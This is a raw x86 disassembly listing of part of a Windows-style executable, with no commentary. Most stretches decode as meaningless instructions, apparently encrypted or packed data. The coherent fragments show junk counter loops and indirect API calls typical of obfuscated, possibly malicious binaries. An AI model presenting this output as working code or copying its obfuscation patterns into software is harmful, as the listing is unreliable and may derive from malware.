  40e6a4:	stos   DWORD PTR es:[edi],eax
  40e6a5:	push   ss
  40e6a6:	pushf  
  40e6a7:	push   cs
  40e6a8:	fst    QWORD PTR [ebp-0x29]
  40e6ab:	jne    0x40e6a4
  40e6ad:	adc    eax,edi
  40e6af:	or     esi,ebp
  40e6b1:	test   al,0xc4
  40e6b3:	icebp  
  40e6b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6b5:	retf   
  40e6b6:	jge    0x40e676
  40e6b8:	mov    al,0xee
  40e6ba:	arpl   WORD PTR [edi-0x4c],dx
  40e6bd:	sbb    al,0x98
  40e6bf:	imul   esp,DWORD PTR [esi-0x47961077],0xffffffe5
  40e6c6:	push   ss
  40e6c7:	nop
  40e6c8:	test   al,0x91
  40e6ca:	test   eax,0x96cf5c61
  40e6cf:	outs   dx,BYTE PTR ds:[esi]
  40e6d0:	int    0x42
  40e6d2:	jns    0x40e660
  40e6d4:	or     al,BYTE PTR [esi]
  40e6d6:	sub    edx,DWORD PTR [ebx-0x67]
  40e6d9:	mov    ebx,0xc3ab6206
  40e6de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6df:	add    bl,dl
  40e6e1:	icebp  
  40e6e2:	cmp    BYTE PTR [edx],dh
  40e6e4:	sbb    eax,0x9b6ef30d
  40e6e9:	leave  
  40e6ea:	in     al,0xa8
  40e6ec:	adc    dh,bl
  40e6ee:	fdiv   QWORD PTR ds:0xd9d8d4ca
  40e6f4:	daa    
  40e6f5:	ror    ebp,cl
  40e6f7:	sbb    dh,dl
  40e6f9:	stc    
  40e6fa:	xchg   DWORD PTR [ebp+edi*4+0x3c63305],ecx
  40e701:	ret    
  40e702:	mov    DWORD PTR [ebp+0x8],eax
  40e705:	mov    eax,ds:0x41eae6
  40e70a:	mov    DWORD PTR [ebp+0x8],eax
  40e70d:	mov    eax,DWORD PTR [ebp-0x14]
  40e710:	mov    DWORD PTR [ebp-0x4],eax
  40e713:	mov    eax,DWORD PTR [ebp-0x4]
  40e716:	push   0x4
  40e718:	pop    ecx
  40e719:	sub    ecx,eax
  40e71b:	add    ecx,DWORD PTR [ebp-0x18]
  40e71e:	mov    DWORD PTR [ebp-0x8],ecx
  40e721:	jmp    0x40e979
  40e726:	(bad)
  40e729:	(bad)  
  40e72a:	leave  
  40e72b:	fcmovbe st,st(5)
  40e72d:	sar    esp,1
  40e72f:	rcr    DWORD PTR [esp+edi*1],1
  40e732:	test   dl,dh
  40e734:	in     eax,dx
  40e735:	idiv   BYTE PTR [edi]
  40e737:	mov    ebx,0x7e357878
  40e73c:	js     0x40e7b6
  40e73e:	mov    dh,0x5b
  40e740:	js     0x40e753
  40e742:	pop    ss
  40e743:	les    edx,FWORD PTR [ecx+0x151db8dc]
  40e749:	sub    al,BYTE PTR [esi+0x71]
  40e74c:	in     eax,dx
  40e74d:	mov    dl,BYTE PTR [esi+0x6c]
  40e750:	fisttp WORD PTR ss:[ebp+0xeccea30]
  40e757:	cmp    al,0x98
  40e759:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e75a:	sub    al,bl
  40e75c:	repnz fdiv QWORD PTR [edx-0x7b]
  40e760:	imul   ebp,DWORD PTR [ecx],0xd9ada740
  40e766:	ins    BYTE PTR es:[edi],dx
  40e767:	cmc    
  40e768:	push   cs
  40e769:	sub    ebp,DWORD PTR [edi-0x15]
  40e76c:	cmp    edx,DWORD PTR [ebp+0x48]
  40e76f:	in     al,0x80
  40e771:	pop    ecx
  40e772:	inc    edi
  40e773:	shl    DWORD PTR [edx+eax*4+0x2],1
  40e777:	jnp    0x40e773
  40e779:	cs dec eax
  40e77b:	or     eax,0x79a02877
  40e780:	gs mov edx,0x7920bcdd
  40e786:	daa    
  40e787:	jg     0x40e7fd
  40e789:	mov    esi,DWORD PTR [edi+0x51bc6da3]
  40e78f:	pop    ebp
  40e790:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e791:	mov    ds:0x1a193269,eax
  40e796:	or     al,0xac
  40e798:	mov    bl,0x7
  40e79a:	fcom   QWORD PTR [eax]
  40e79c:	adc    DWORD PTR [edx],ecx
  40e79e:	mov    eax,0x31d9d73e
  40e7a3:	mov    ah,0x80
  40e7a5:	imul   edx,DWORD PTR [ebx],0x75f09059
  40e7ab:	test   eax,0xe41fe193
  40e7b0:	cld    
  40e7b1:	and    dh,0xec
  40e7b4:	xchg   DWORD PTR [edi-0x52e9b3a3],esi
  40e7ba:	dec    ebx
  40e7bb:	cmp    eax,0xd7d62d3c
  40e7c0:	sbb    eax,0x6f240876
  40e7c5:	pop    edi
  40e7c6:	jmp    0xd7e8:0xfb2b1f82
  40e7cd:	xor    dh,BYTE PTR [edx]
  40e7cf:	fldcw  WORD PTR [esi+0x282841c0]
  40e7d5:	mov    ebp,0xab4b6f32
  40e7da:	(bad)  [edx-0x11]
  40e7dd:	add    bh,ah
  40e7df:	push   0x2f653127
  40e7e4:	aam    0x6b
  40e7e6:	in     al,0x1f
  40e7e8:	fidiv  WORD PTR ds:[ebx+0x7d]
  40e7ec:	(bad)  
  40e7ed:	popf   
  40e7ee:	sti    
  40e7ef:	retf   
  40e7f0:	aam    0x17
  40e7f2:	xlat   BYTE PTR ds:[ebx]
  40e7f3:	xchg   ebx,eax
  40e7f4:	add    BYTE PTR [edx],cl
  40e7f6:	loopne 0x40e85c
  40e7f8:	mov    dh,0x63
  40e7fa:	hlt    
  40e7fb:	adc    DWORD PTR [edx],edi
  40e7fd:	pop    ecx
  40e7fe:	add    dl,BYTE PTR [ecx+eax*2-0x6e]
  40e802:	es or  edx,DWORD PTR fs:[edi+0x9b3843]
  40e80a:	cs icebp 
  40e80c:	jb     0x40e82b
  40e80e:	and    al,0x82
  40e810:	inc    eax
  40e811:	adc    bh,al
  40e813:	loopne 0x40e82a
  40e815:	jge    0x40e87c
  40e817:	pop    ebp
  40e818:	jae    0x40e893
  40e81a:	aad    0xd6
  40e81c:	ret    0x51e4
  40e81f:	push   cs
  40e820:	xor    eax,0x8408258d
  40e825:	push   eax
  40e826:	ja     0x40e86d
  40e828:	jbe    0x40e7e5
  40e82a:	mov    ds:0xf5f145f5,al
  40e82f:	xchg   edi,eax
  40e830:	push   esi
  40e831:	test   eax,0xfc4df226
  40e836:	std    
  40e837:	mov    ah,0x9f
  40e839:	test   cl,al
  40e83b:	xor    eax,0xb3f3acc8
  40e840:	mov    bl,bh
  40e842:	inc    esi
  40e843:	add    eax,0xcfd0323f
  40e848:	js     0x40e8b4
  40e84a:	pop    esi
  40e84b:	cmc    
  40e84c:	push   eax
  40e84d:	add    edx,DWORD PTR [edi+0x49]
  40e850:	sub    ah,BYTE PTR [ecx]
  40e852:	sub    al,0xfe
  40e854:	xor    dh,BYTE PTR [ebx+0x1f]
  40e857:	cmp    edi,ecx
  40e859:	and    DWORD PTR [eax+0x34b11fe],esp
  40e85f:	inc    esp
  40e860:	(bad)  
  40e861:	mov    esi,0x15c7d62
  40e866:	push   ecx
  40e867:	mov    eax,0x2c0547d5
  40e86c:	call   0xcf5f:0xe09c471d
  40e873:	jge    0x40e820
  40e875:	xor    dl,BYTE PTR [ecx+0x36c6bb72]
  40e87b:	fcmovb st,st(3)
  40e87d:	into   
  40e87e:	in     eax,dx
  40e87f:	arpl   WORD PTR [ecx],ax
  40e881:	adc    ebp,DWORD PTR [ebp+0x73ec2673]
  40e887:	das    
  40e888:	pop    eax
  40e889:	ret    
  40e88a:	dec    ebp
  40e88b:	iret   
  40e88c:	(bad)  
  40e88d:	cli    
  40e88e:	mov    al,bl
  40e890:	sbb    eax,0x137a18ee
  40e895:	aas    
  40e896:	ja     0x40e8e3
  40e898:	jmp    0x2b6f:0xb725f206
  40e89f:	adc    BYTE PTR [ecx+0x6e],cl
  40e8a2:	jb     0x40e829
  40e8a4:	xlat   BYTE PTR ds:[ebx]
  40e8a5:	fst    st(2)
  40e8a7:	mov    al,ds:0x85986058
  40e8ac:	repnz lods al,BYTE PTR cs:[esi]
  40e8af:	lock mov ss,WORD PTR [ebp-0x571f901e]
  40e8b6:	mov    ds:0x1585d344,eax
  40e8bb:	jmp    0xa697cec1
  40e8c0:	repnz adc BYTE PTR [esi-0x69],ah
  40e8c4:	jle    0x40e941
  40e8c6:	repz sbb eax,0x24237e4e
  40e8cc:	test   al,0x35
  40e8ce:	stc    
  40e8cf:	sbb    dl,BYTE PTR [ebp+0x28]
  40e8d2:	and    eax,DWORD PTR [ebx]
  40e8d4:	mov    bl,0x6c
  40e8d6:	cs (bad) 
  40e8d8:	cmp    al,0x5c
  40e8da:	lahf   
  40e8db:	loopne 0x40e86a
  40e8dd:	mov    ss,WORD PTR [eax+0x49]
  40e8e0:	pop    ebp
  40e8e1:	xchg   edi,eax
  40e8e2:	cmp    ch,bl
  40e8e4:	inc    ebp
  40e8e5:	push   esp
  40e8e6:	loope  0x40e8e8
  40e8e8:	scas   eax,DWORD PTR es:[edi]
  40e8e9:	out    0x44,eax
  40e8eb:	mov    DWORD PTR [esi+0x7be4b425],esi
  40e8f1:	pop    ebx
  40e8f2:	iret   
  40e8f3:	jne    0x40e974
  40e8f5:	mov    dh,0xce
  40e8f7:	(bad)  
  40e8f8:	stos   DWORD PTR es:[edi],eax
  40e8f9:	push   ebx
  40e8fa:	cld    
  40e8fb:	test   BYTE PTR [ebx],cl
  40e8fd:	xchg   esi,eax
  40e8fe:	xlat   BYTE PTR ds:[ebx]
  40e8ff:	shr    DWORD PTR [edi+0x577b5e3],1
  40e905:	cmp    dh,0x92
  40e908:	(bad)  [eax]
  40e90a:	int    0xd9
  40e90c:	cmp    edx,edx
  40e90e:	mov    ah,BYTE PTR [esi-0x8657868]
  40e914:	in     eax,0xe9
  40e916:	test   DWORD PTR [esi+0x57111ad2],esi
  40e91c:	retf   
  40e91d:	mov    DWORD PTR [eax],edx
  40e91f:	mov    eax,ds:0x6e65e445
  40e924:	cli    
  40e925:	test   al,0x6a
  40e927:	mov    ecx,0xb40f1b92
  40e92c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e92d:	jne    0x40e953
  40e92f:	fmul   DWORD PTR fs:[edx+0x52347930]
  40e936:	mov    cl,0x4a
  40e938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e939:	add    eax,0x75de7b5f
  40e93e:	dec    eax
  40e93f:	out    0x61,al
  40e941:	mov    esp,edx
  40e943:	stos   BYTE PTR es:[edi],al
  40e944:	shl    DWORD PTR [ebx],1
  40e946:	sub    ebx,DWORD PTR [eax-0x18a96ea4]
  40e94c:	and    al,0x2d
  40e94e:	retf   
  40e94f:	or     DWORD PTR [eax-0x458f6c8c],0x30
  40e956:	aam    0xee
  40e958:	stc    
  40e959:	xchg   edx,eax
  40e95a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e95b:	mov    al,0x4e
  40e95d:	push   di
  40e95f:	aaa    
  40e960:	in     al,dx
  40e961:	adc    esi,ebx
  40e963:	cmovne ebp,DWORD PTR [edi+0x7423a106]
  40e96a:	test   al,0x68
  40e96c:	pop    edx
  40e96d:	(bad)  
  40e96e:	dec    DWORD PTR [eax]
  40e970:	ss aas 
  40e972:	(bad)
  40e975:	and    al,0xf2
  40e977:	sub    BYTE PTR [edx+0x330c458b],cl
  40e97d:	(bad)  
  40e97e:	lea    edi,[edi+eax*1+0x327298]
  40e985:	cmp    edi,0x50a
  40e98b:	jne    0x40d51f
  40e991:	mov    eax,DWORD PTR [ebp+0xc]
  40e994:	pop    edi
  40e995:	xor    eax,esi
  40e997:	pop    esi
  40e998:	add    eax,ebx
  40e99a:	pop    ebx
  40e99b:	leave  
  40e99c:	ret    0x8
  40e99f:	push   ebp
  40e9a0:	mov    ebp,esp
  40e9a2:	sub    esp,0x44
  40e9a5:	push   edi
  40e9a6:	mov    eax,DWORD PTR [ebp+0xc]
  40e9a9:	mov    DWORD PTR [ebp-0x10],eax
  40e9ac:	mov    eax,DWORD PTR [ebp+0x8]
  40e9af:	and    DWORD PTR ds:0x42a7f1,0x0
  40e9b9:	mov    edx,DWORD PTR ds:0x42a7f1
  40e9bf:	inc    edx
  40e9c0:	mov    DWORD PTR ds:0x42a7f1,edx
  40e9c6:	cmp    DWORD PTR ds:0x42a7f1,0x6
  40e9cd:	jne    0x40e9dc
  40e9d3:	push   DWORD PTR [ebp-0x28]
  40e9d6:	call   DWORD PTR ds:0x41d250
  40e9dc:	cmp    DWORD PTR ds:0x42a7f1,0x5
  40e9e3:	jne    0x40e9f6
  40e9e9:	mov    edx,DWORD PTR ds:0x42a7f1
  40e9ef:	inc    edx
  40e9f0:	mov    DWORD PTR ds:0x42a7f1,edx
  40e9f6:	cmp    DWORD PTR ds:0x42a7f1,0x10
  40e9fd:	jb     0x40e9b9
  40ea03:	mov    DWORD PTR [ebp+0x8],0xf89c8538
  40ea0a:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  40ea11:	jmp    0x40ec99
  40ea16:	cmp    eax,0xd6ce3ed7
  40ea1b:	aad    0xcd
  40ea1d:	xlat   BYTE PTR ds:[ebx]
  40ea1e:	jecxz  0x40e9ce
  40ea20:	ja     0x40e9b6
  40ea22:	mov    ebx,DWORD PTR [edx-0x460bb532]
  40ea28:	js     0x40eaa2
  40ea2a:	in     eax,0x7e
  40ea2c:	js     0x40eaa6
  40ea2e:	fdiv   DWORD PTR [edx]
  40ea30:	xor    eax,0x26268bdd
  40ea35:	jno    0x40e9da
  40ea37:	push   ds
  40ea38:	mov    ah,0xe0
  40ea3a:	mov    esi,0x79b10bbc
  40ea3f:	and    eax,0xab010f15
  40ea44:	loopne 0x40e9d1
  40ea46:	aam    0xfa
  40ea48:	int    0x6e
  40ea4a:	lods   eax,DWORD PTR ds:[esi]
  40ea4b:	stc    
  40ea4c:	mov    al,ds:0xfce8594c
  40ea51:	mov    al,bl
  40ea53:	xlat   BYTE PTR ds:[ebx]
  40ea54:	ficom  DWORD PTR [edx]
  40ea56:	sub    DWORD PTR [ebx],ebx
  40ea58:	add    BYTE PTR [edi],al
  40ea5a:	fs jne 0x40ea73
  40ea5d:	sub    ecx,DWORD PTR [eax-0xb]
  40ea60:	je     0x40ea98
  40ea62:	sbb    DWORD PTR [eax-0x6a],ecx
  40ea65:	aad    0xea
  40ea67:	cs out dx,eax
  40ea69:	jp     0x40eaad
  40ea6b:	pop    ecx
  40ea6c:	sub    esp,ebp
  40ea6e:	mov    edi,0xcd9f7a23
  40ea73:	jmp    0xc2b9:0xf1fdcbc1
  40ea7a:	pop    eax
  40ea7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea7c:	cwde   
  40ea7d:	pusha  
  40ea7e:	test   BYTE PTR [ebx-0x56],ch
  40ea81:	outs   dx,BYTE PTR ds:[esi]
  40ea82:	hlt    
  40ea83:	(bad)  
  40ea84:	outs   dx,BYTE PTR ds:[esi]
  40ea85:	pop    edi
  40ea86:	loop   0x40ea66
  40ea88:	sub    eax,DWORD PTR [edi-0x537d0e8f]
  40ea8e:	adc    BYTE PTR [eax+edi*4+0x13],al
  40ea92:	add    eax,0x9b183e2d
  40ea97:	retf   0x759
  40ea9a:	dec    eax
  40ea9b:	mov    ah,0xae
  40ea9d:	push   0xb49e0808
  40eaa2:	jnp    0x40eaef
  40eaa4:	outs   dx,DWORD PTR ds:[esi]
  40eaa5:	push   esi
  40eaa6:	sub    al,0x9a
  40eaa8:	lahf   
  40eaa9:	mov    bh,0xd1
  40eaab:	lds    ebp,FWORD PTR [eax]
  40eaad:	lods   eax,DWORD PTR ds:[esi]
  40eaae:	ds dec edx
  40eab0:	mov    ds:0x4c5a596a,al
  40eab5:	aaa    
  40eab6:	int    0x18
  40eab8:	dec    ecx
  40eab9:	dec    ebp
  40eaba:	je     0x40eb06
  40eabc:	rcr    DWORD PTR [ecx+0x545b0f75],cl
  40eac2:	cmp    DWORD PTR [edi-0x4df06329],esp
  40eac8:	pop    esp
  40eac9:	test   eax,0xbbc2520b
  40eace:	into   
  40eacf:	pop    esp
  40ead0:	out    0xa8,al
  40ead2:	scas   eax,DWORD PTR es:[edi]
  40ead3:	or     ah,BYTE PTR [ebp-0x53]
  40ead6:	pop    ss
  40ead7:	int    0xbc
  40ead9:	dec    edi
  40eada:	jmp    0xba166fd7
  40eadf:	fidivr WORD PTR [eax]
  40eae1:	push   ebp
  40eae2:	test   BYTE PTR [esi+0x3e],al
  40eae5:	(bad)  
  40eae6:	aas    
  40eae7:	push   edi
  40eae8:	push   esp
  40eae9:	push   es
  40eaea:	dec    eax
  40eaeb:	mov    edx,0xaff2be8b
  40eaf0:	rcl    cl,0x98
  40eaf3:	mov    bl,0xa9
  40eaf5:	out    dx,eax
  40eaf6:	scas   eax,DWORD PTR es:[edi]
  40eaf7:	fbld   TBYTE PTR [esi-0x16]
  40eafa:	cmp    eax,0xfb46f193
  40eaff:	aam    0x77
  40eb01:	push   ebp
  40eb02:	push   ebx
  40eb03:	iret   
  40eb04:	mov    ecx,0xcadb46b1
  40eb09:	adc    ebp,DWORD PTR [esi-0x27b34536]
  40eb0f:	sahf   
  40eb10:	jns    0x40ead3
  40eb12:	pop    ebx
  40eb13:	fimul  DWORD PTR [ebx+0x7d]
  40eb16:	rcl    BYTE PTR ds:0x91423015,1
  40eb1c:	rcr    BYTE PTR ds:0x5a3f7657,1
  40eb22:	inc    eax
  40eb23:	inc    esi
  40eb24:	(bad)  
  40eb25:	(bad)  
  40eb26:	jmp    0xeffd2bda
  40eb2b:	rcr    ecx,1
  40eb2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb2e:	mov    eax,0xa8b99212
  40eb33:	shr    dh,1
  40eb35:	into   
  40eb36:	and    eax,0x87536a81
  40eb3b:	mov    esi,0x1707c057
  40eb40:	cdq    
  40eb41:	mov    bh,0xe8
  40eb43:	sbb    ah,dh
  40eb45:	fistp  DWORD PTR [edx+0xe7f458f]
  40eb4b:	mov    es,WORD PTR [ebx-0x38a2213e]
  40eb51:	nop
  40eb52:	scas   al,BYTE PTR es:[edi]
  40eb53:	inc    esp
  40eb54:	sbb    al,0x6
  40eb56:	mov    al,0x51
  40eb58:	jo     0x40ebcc
  40eb5a:	adc    BYTE PTR [edi],al
  40eb5c:	iret   
  40eb5d:	pop    edx
  40eb5e:	sub    al,0x6b
  40eb60:	adc    dl,BYTE PTR [ebp+edx*4+0x27]
  40eb64:	mov    al,BYTE PTR [ebx]
  40eb66:	(bad)  
  40eb67:	icebp  
  40eb68:	sbb    dh,BYTE PTR [esi]
  40eb6a:	jbe    0x40eb76
  40eb6c:	fld    QWORD PTR [edx]
  40eb6e:	mov    edx,ebp
  40eb70:	cli    
  40eb71:	stos   BYTE PTR es:[edi],al
  40eb72:	je     0x40eb12
  40eb74:	loopne 0x40ebc9
  40eb76:	adc    DWORD PTR [edi],edi
  40eb78:	mov    ds,WORD PTR [ebp+0x36e0794f]
  40eb7e:	mov    ecx,0x8caeca62
  40eb83:	xchg   ecx,eax
  40eb84:	fld    DWORD PTR [eax-0x9]
  40eb87:	xor    eax,0x66ef0f1f
  40eb8c:	repz std 
  40eb8e:	inc    esp
  40eb8f:	inc    ecx
  40eb90:	test   BYTE PTR [ecx-0x4a],bh
  40eb93:	call   0x3862:0xc1a7f6c1
  40eb9a:	loop   0x40ebd6
  40eb9c:	push   ss
  40eb9d:	test   al,0x93
  40eb9f:	xor    eax,0xa8c7c979
  40eba4:	adc    BYTE PTR ds:0xe178dc6,al
  40ebaa:	ret    0x8610
  40ebad:	(bad)  
  40ebae:	ins    DWORD PTR es:[edi],dx
  40ebaf:	pop    ss
  40ebb0:	mov    esp,0x57b082f
  40ebb5:	cmp    al,0x2d
  40ebb7:	std    
  40ebb8:	push   es
  40ebb9:	xchg   ch,ah
  40ebbb:	jns    0x40eb44
  40ebbd:	retf   0x57ae
  40ebc0:	shl    BYTE PTR [ebx-0x3f],cl
  40ebc3:	cwde   
  40ebc4:	mov    ds:0x6c3f530c,al
  40ebc9:	std    
  40ebca:	cmp    BYTE PTR [esi+0x32],al
  40ebcd:	test   BYTE PTR [edi+ebx*2-0x1fe1116e],dl
  40ebd4:	ud0    eax,esi
  40ebd7:	mov    esi,0x4c479c76
  40ebdc:	out    0x49,eax
  40ebde:	mov    ecx,0xcfa417e4
  40ebe3:	scas   al,BYTE PTR es:[edi]
  40ebe4:	fdivrp st(7),st
  40ebe6:	mov    bl,0x23
  40ebe8:	neg    DWORD PTR [edi]
  40ebea:	popa   
  40ebeb:	test   DWORD PTR [ebp+0x3a],edi
  40ebee:	inc    esi
  40ebef:	add    edi,esp
  40ebf1:	stc    
  40ebf2:	mov    bl,0xda
  40ebf4:	jle    0x40ebf9
  40ebf6:	jb     0x40ec06
  40ebf8:	in     al,0x43
  40ebfa:	aam    0x97
  40ebfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebfd:	add    eax,0x2bc63360
  40ec02:	mov    bh,0xc1
  40ec04:	push   esp
  40ec05:	push   0x35fc16fb
  40ec0a:	sbb    al,0x92
  40ec0c:	pop    eax
  40ec0d:	push   cs
  40ec0e:	mov    WORD PTR [edi],fs
  40ec10:	cmp    al,0xa0
  40ec12:	xchg   ebp,eax
  40ec13:	fpatan 
  40ec15:	mov    ds:0xeb5188a7,al
  40ec1a:	adc    BYTE PTR [eax+edx*4+0x27],0xd5
  40ec1f:	mov    eax,DWORD PTR ds:0x5fd44c38
  40ec25:	pop    ds
  40ec26:	or     edx,edi
  40ec28:	inc    ecx
  40ec29:	sbb    al,dl
  40ec2b:	and    DWORD PTR [esi],esp
  40ec2d:	xor    eax,0x541cdf51
  40ec32:	cmc    
  40ec33:	(bad)  
  40ec34:	fldcw  WORD PTR [edi-0x7b9c9e25]
  40ec3b:	push   esi
  40ec3c:	in     eax,dx
  40ec3d:	inc    ebx
  40ec3e:	lods   eax,DWORD PTR ds:[esi]
  40ec3f:	sbb    cl,BYTE PTR [edx-0x32b25dc]
  40ec45:	cld    
  40ec46:	mov    bh,0x5e
  40ec48:	mul    DWORD PTR [edx]
  40ec4a:	out    dx,eax
  40ec4b:	dec    edi
  40ec4c:	pop    ss
  40ec4d:	ds clc 
  40ec4f:	into   
  40ec50:	fbld   TBYTE PTR [esi]
  40ec52:	mov    ah,0xb7
  40ec54:	cdq    
  40ec55:	sbb    DWORD PTR [esi+0x7626a70e],esi
  40ec5b:	push   edi
  40ec5c:	xchg   DWORD PTR [ecx-0x4b],edx
  40ec5f:	sbb    BYTE PTR [edi+0x32],0xd
  40ec63:	sbb    ebp,DWORD PTR ds:0x96ae833c
  40ec69:	cmp    DWORD PTR [edi-0x55],edi
  40ec6c:	push   ecx
  40ec6d:	pop    ecx
  40ec6e:	jb     0x40ecd7
  40ec70:	or     bh,ch
  40ec72:	rol    BYTE PTR [ecx+0x1fc6e0e],cl
  40ec78:	mov    bh,dh
  40ec7a:	cmp    DWORD PTR [ebp-0x6c2a6ccd],esi
  40ec80:	in     al,dx
  40ec81:	ret    0xdc4f
  40ec84:	lods   al,BYTE PTR ds:[esi]
  40ec85:	gs pop ss
  40ec87:	fsubr  DWORD PTR [ebx]
  40ec89:	xchg   esi,eax
  40ec8a:	imul   esi,DWORD PTR ds:0xbb083930,0xffffffe5
  40ec91:	add    BYTE PTR [edi],bh
  40ec93:	dec    ebp
  40ec94:	adc    eax,0x199970f0
  40ec99:	mov    edx,DWORD PTR [ebp+0x8]
  40ec9c:	or     ecx,DWORD PTR ds:0x42a77d
  40eca2:	mov    DWORD PTR [ebp-0x40],eax
  40eca5:	mov    eax,0x7510850
  40ecaa:	xor    edx,eax
  40ecac:	add    edi,0x2fd0
  40ecb2:	mov    ecx,0x327298
  40ecb7:	mov    DWORD PTR ds:0x42a879,0x17
  40ecc1:	cmp    DWORD PTR ds:0x42a879,0x0
  40ecc8:	je     0x40ed80
  40ecce:	cmp    DWORD PTR ds:0x42a879,0x5
  40ecd5:	jne    0x40ecf1
  40ecdb:	push   DWORD PTR [ebp-0x1c]
  40ecde:	push   0x65c1
  40ece3:	push   DWORD PTR [ebp-0x20]
  40ece6:	push   0x6120
  40eceb:	call   DWORD PTR ds:0x41d254
  40ecf1:	cmp    DWORD PTR ds:0x42a879,0x6
  40ecf8:	jne    0x40ed0b
  40ecfe:	mov    edi,DWORD PTR ds:0x42a879
  40ed04:	dec    edi
  40ed05:	mov    DWORD PTR ds:0x42a879,edi
  40ed0b:	mov    edi,DWORD PTR ds:0x42a879
  40ed11:	dec    edi
  40ed12:	mov    DWORD PTR ds:0x42a879,edi
  40ed18:	jmp    0x40ecc1
  40ed1d:	and    DWORD PTR ds:0x42a885,0x0
  40ed27:	mov    edi,DWORD PTR ds:0x42a885
  40ed2d:	inc    edi
  40ed2e:	mov    DWORD PTR ds:0x42a885,edi
  40ed34:	cmp    DWORD PTR ds:0x42a885,0x5
  40ed3b:	jne    0x40ed53
  40ed41:	push   DWORD PTR [ebp-0xc]
  40ed44:	push   DWORD PTR [ebp-0xc]
  40ed47:	push   DWORD PTR [ebp-0x18]
  40ed4a:	push   DWORD PTR [ebp-0x14]
  40ed4d:	call   DWORD PTR ds:0x41d1a4
  40ed53:	cmp    DWORD PTR ds:0x42a885,0x4
  40ed5a:	jne    0x40ed6d
  40ed60:	mov    edi,DWORD PTR ds:0x42a885
  40ed66:	inc    edi
  40ed67:	mov    DWORD PTR ds:0x42a885,edi
  40ed6d:	cmp    DWORD PTR ds:0x42a885,0x1f
  40ed74:	jb     0x40ed27
  40ed7a:	add    edi,DWORD PTR ds:0x42a7fd
  40ed80:	add    edx,ecx
  40ed82:	mov    edi,DWORD PTR ds:0x42a7f1
  40ed88:	xor    DWORD PTR ds:0x42a875,edi
  40ed8e:	jmp    0x40f016
  40ed93:	retf   0xc5c0
  40ed96:	ror    cl,0xc5
  40ed99:	leave  
  40ed9a:	retf   0x1a17
  40ed9d:	push   edx
  40ed9e:	xchg   edx,eax
  40ed9f:	lods   al,BYTE PTR ds:[esi]
  40eda0:	mov    ch,0xac
  40eda2:	adc    al,0x61
  40eda4:	mov    edi,0x7ee57878
  40eda9:	js     0x40ee23
  40edab:	mov    cl,0x99
  40edad:	dec    ebx
  40edae:	popa   
  40edaf:	iret   
  40edb0:	adc    BYTE PTR [ecx],al
  40edb2:	pop    ebp
  40edb3:	inc    ebx
  40edb4:	test   bl,dh
  40edb6:	ins    BYTE PTR es:[edi],dx
  40edb7:	not    ch
  40edb9:	mov    eax,DWORD PTR [edi+0x2fac4363]
  40edbf:	js     0x40ed81
  40edc1:	xchg   bl,ch
  40edc3:	inc    ecx
  40edc4:	adc    al,0xca
  40edc6:	icebp  
  40edc7:	dec    edi
  40edc8:	(bad)  
  40edca:	add    dh,BYTE PTR [edi+0x3a]
  40edcd:	mov    edi,0xb5b6d580
  40edd2:	xor    eax,0x71740a48
  40edd7:	sbb    ebp,DWORD PTR [eax-0x80]
  40edda:	mov    BYTE PTR [eax],ah
  40eddc:	xchg   ecx,eax
  40eddd:	jns    0x40edcd
  40eddf:	sub    ah,dl
  40ede1:	stos   BYTE PTR es:[edi],al
  40ede2:	or     DWORD PTR [ecx],esp
  40ede4:	or     al,0xc9
  40ede6:	lahf   
  40ede7:	jl     0x40ed7d
  40ede9:	mov    DWORD PTR [esi*2-0x5616845e],esp
  40edf0:	xor    ebp,DWORD PTR [eax-0x48dbb527]
  40edf6:	fldcw  WORD PTR [eax]
  40edf8:	mov    al,ds:0x24039dd1
  40edfd:	ja     0x40edd6
  40edff:	mov    edx,0x2aa332ad
  40ee04:	mov    bh,BYTE PTR [ebx]
  40ee06:	retf   0x65a1
  40ee09:	mov    edx,DWORD PTR ds:0xf21a6d59
  40ee0f:	dec    DWORD PTR [eax-0x5a0b7ae2]
  40ee15:	dec    edx
  40ee16:	push   eax
  40ee17:	jmp    0xe6362997
  40ee1c:	or     al,0x66
  40ee1e:	sbb    DWORD PTR [ecx],ebx
  40ee20:	pop    ebx
  40ee21:	xchg   ebx,eax
  40ee22:	and    DWORD PTR [edi-0x58cf329a],esi
  40ee28:	xor    al,0xe1
  40ee2a:	mov    ds:0x2aeb7cb8,al
  40ee2f:	frstor [edi-0x3d2413a2]
  40ee35:	or     eax,0xdbdb8a8e
  40ee3a:	push   edi
  40ee3b:	inc    ecx
  40ee3c:	fbstp  TBYTE PTR [edi-0x2b]
  40ee3f:	add    al,0xf1
  40ee41:	push   sp
  40ee43:	pop    esi
  40ee44:	mov    ah,0x5a
  40ee46:	xchg   esp,eax
  40ee47:	xor    al,0xb9
  40ee49:	mov    bl,0x82
  40ee4b:	aam    0x56
  40ee4d:	lds    edi,FWORD PTR [ecx-0x6e8e232]
  40ee53:	mov    BYTE PTR ss:[ebx-0xc522f4f],al
  40ee5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee5b:	mov    dh,0x72
  40ee5d:	xacquire xchg BYTE PTR [edx+0x3d3abd6d],ch
  40ee64:	push   ss
  40ee65:	adc    esp,DWORD PTR [eax+0x65003404]
  40ee6b:	inc    ebx
  40ee6c:	popa   
  40ee6d:	cmp    al,0x42
  40ee6f:	loope  0x40ee5f
  40ee71:	push   ebp
  40ee72:	loopne 0x40eeeb
  40ee74:	and    al,0xe4
  40ee76:	xchg   ebx,eax
  40ee77:	div    ebx
  40ee79:	in     eax,0xcd
  40ee7b:	aad    0x3b
  40ee7d:	fadd   QWORD PTR [eax]
  40ee7f:	shr    edx,cl
  40ee81:	cmp    eax,0x398ab05f
  40ee86:	nop
  40ee87:	rcr    DWORD PTR [edx+0x6e],0x17
  40ee8b:	jne    0x40ef06
  40ee8d:	jmp    0x1d79d936
  40ee92:	mov    edi,0x1d797e38
  40ee97:	or     al,0x88
